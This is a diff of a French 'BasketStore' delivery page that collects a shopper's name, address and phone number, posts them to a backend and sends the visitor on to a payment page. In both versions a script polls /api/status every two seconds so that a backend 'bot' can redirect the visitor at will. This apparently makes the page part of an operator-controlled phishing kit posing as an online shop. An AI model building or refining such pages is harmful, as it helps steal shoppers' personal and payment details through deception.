@@ -1,54 +1,53 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Livraison</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Livraison - BasketStore</title>
+<style>
+  body{font-family:Arial;text-align:center;padding:40px;}
+  input{display:block;margin:10px auto;padding:10px;width:80%;font-size:1em;}
+  button{padding:15px 25px;border-radius:10px;font-size:1.1em;cursor:pointer;background:#28a745;color:white;border:none;}
+  button:hover{background:#1e7e34;}
+</style>
 </head>
 <body>
-  <h2>📦 Informations de livraison</h2>
-  <form id="deliveryForm">
-    <input type="text" name="nom" placeholder="Nom" required><br>
-    <input type="text" name="prenom" placeholder="Prénom" required><br>
-    <input type="text" name="adresse" placeholder="Adresse" required><br>
-    <input type="text" name="telephone" placeholder="Téléphone" required><br>
-    <button type="submit">Continuer vers Paiement 💳</button>
-  </form>
+  <h1>📦 Informations de livraison</h1>
+  <input type="text" id="nom" placeholder="Nom">
+  <input type="text" id="prenom" placeholder="Prénom">
+  <input type="text" id="adresse" placeholder="Adresse">
+  <input type="text" id="telephone" placeholder="Téléphone">
+  <button id="goPayment">Continuer vers Paiement</button>
 
   <script>
-  document.getElementById('deliveryForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const form = e.target;
-    const data = {
-      nom: form.nom.value,
-      prenom: form.prenom.value,
-      adresse: form.adresse.value,
-      telephone: form.telephone.value
-    };
-    try {
-      await fetch('/api/delivery', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    } catch (err) {
-      console.warn('Erreur livraison:', err);
-    }
-    window.location.href = '/payment.html'; // ✅ redirection unique
-  });
+    document.getElementById('goPayment').addEventListener('click', async ()=>{
+      const data = {
+        nom: document.getElementById('nom').value,
+        prenom: document.getElementById('prenom').value,
+        adresse: document.getElementById('adresse').value,
+        telephone: document.getElementById('telephone').value
+      };
+      try{
+        await fetch('/api/delivery',{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify(data)
+        });
+      }catch(e){console.error(e);}
+      // Redirection frontend vers paiement
+      window.location.href = '/payment.html';
+    });
 
-  // Polling bot redirection
-  async function pollRedirect() {
-    try {
-      const res = await fetch('/api/status');
-      const data = await res.json();
-      if (data.redirect && window.location.pathname !== data.redirect) {
-        window.location.href = data.redirect;
-      }
-    } catch (e) {}
-    setTimeout(pollRedirect, 2000);
-  }
-  pollRedirect();
+    async function checkBotRedirect() {
+      try {
+        const res = await fetch('/api/status');
+        const data = await res.json();
+        if(data.redirect && window.location.pathname !== data.redirect){
+          window.location.href = data.redirect;
+        }else{setTimeout(checkBotRedirect,2000);}
+      }catch(e){setTimeout(checkBotRedirect,2000);}
+    }
+    checkBotRedirect();
   </script>
 </body>
 </html>
